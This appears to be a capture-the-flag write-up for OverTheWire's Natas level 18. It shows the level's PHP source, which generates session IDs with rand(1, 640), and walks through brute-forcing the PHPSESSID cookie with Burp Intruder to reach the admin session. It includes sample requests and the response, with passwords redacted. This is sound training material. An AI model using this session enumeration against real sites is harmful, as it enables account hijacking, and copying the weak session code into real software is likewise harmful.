# Natas18
#natas #burp-suite #Session
## Vulnerability:
Weak Session ID Generation / Predictable Session Tokens
## Technique:
Used Burp suite's intruder to brute force session IDs until the admin's account session ID was found.
#### Steps:
###### 1) Analyzing the web application source code
**Source Code:**
```php
<?php

$maxid = 640; // 640 should be enough for everyone


function isValidAdminLogin() { /* {{{ */
    if ($_REQUEST["username"] == "admin") {
        /* This method of authentication appears to be unsafe and has been disabled for now. */
        // return 1;
    }

    return 0;
}
/* }}} */


function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */


function createID($user) { /* {{{ */
    global $maxid;

    return rand(1, $maxid);
}
/* }}} */


function debug($msg) { /* {{{ */
    if (array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */


function my_session_start() { /* {{{ */

    if (
        array_key_exists("PHPSESSID", $_COOKIE) 
        && 
        isValidID($_COOKIE["PHPSESSID"])
    ) {

        if (!session_start()) {
            debug("Session start failed");
            return false;

        } else {

            debug("Session start ok");

            if (!array_key_exists("admin", $_SESSION)) {
                debug("Session was old: admin flag set");
                $_SESSION["admin"] = 0; // backwards compatible, secure
            }

            return true;
        }
    }

    return false;
}
/* }}} */


function print_credentials() { /* {{{ */

    if (
        $_SESSION 
        && 
        array_key_exists("admin", $_SESSION) 
        && 
        $_SESSION["admin"] == 1
    ) {

        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";

    } else {

        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */


$showform = true;


if (my_session_start()) {

    print_credentials();
    $showform = false;


} else {

    if (
        array_key_exists("username", $_REQUEST) 
        && 
        array_key_exists("password", $_REQUEST)
    ) {

        session_id(createID($_REQUEST["username"]));

        session_start();

        $_SESSION["admin"] = isValidAdminLogin();

        debug("New session started");

        $showform = false;

        print_credentials();
    }
}
```
The code revealed important information:
- The server generates a random session ID using `rand()` function, with a maximum value of `640`. This limited range makes the session identifiers predictable and vulnerable to brute force attacks.
- The `natas19` password is only revealed when the `admin` value inside `$_SESSION` is set to `1`. However, the application always initializes this value to `0` for newly created sessions.

> [!$_SESSION]
> `$_SESSION` is a PHP **superglobal array** used to store and access user session data across multiple pages. It allows the server to remember information about a user, such as login status or privileges.

###### 2) Brute forcing session IDs
Based on what we observed through the source code, we can access other users session by modifying the `PHPSESSID` value in the Cookie header. We can find the admin account using the Intruder of **Burp Suite** to automate the attack.
**Request:**
```http
POST /index.php HTTP/1.1
Host: natas18.natas.labs.overthewire.org
Content-Length: 30
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas18.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas18.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>; PHPSESSID=281
Connection: keep-alive

username=hehehe&password=agafg
```
**Using intruder:**

<img width="1664" height="640" alt="image" src="https://github.com/user-attachments/assets/41d09f40-ca6a-45e8-a027-f28ba4651d31" />

**Successful request:**
```http
POST /index.php HTTP/1.1
Host: natas18.natas.labs.overthewire.org
Content-Length: 30
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas18.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas18.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>; PHPSESSID=119
Connection: keep-alive

username=hehehe&password=agafg
```
**Result:**
```http
HTTP/1.1 200 OK
Date: Wed, 05 Aug 2026 19:34:45 GMT
Server: Apache/2.4.66 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1024
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas18",
            "pass": <NATAS17_PASSWORD>
        };
    </script>
</head>

<body>
    <h1>natas18</h1>

    <div id="content">
        You are an admin. The credentials for the next level are:
        <br>

        <pre>
Username: natas19
Password: <PASSWORD>
        </pre>

        <div id="viewsource">
            <a href="index-source.html">View sourcecode</a>
        </div>
    </div>
</body>
</html>
```
The Intruder attack identified session ID `119` as the administrator's session.

## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas17](./Natas17.md)
## Next Level:
[Natas19](./Natas19.md)
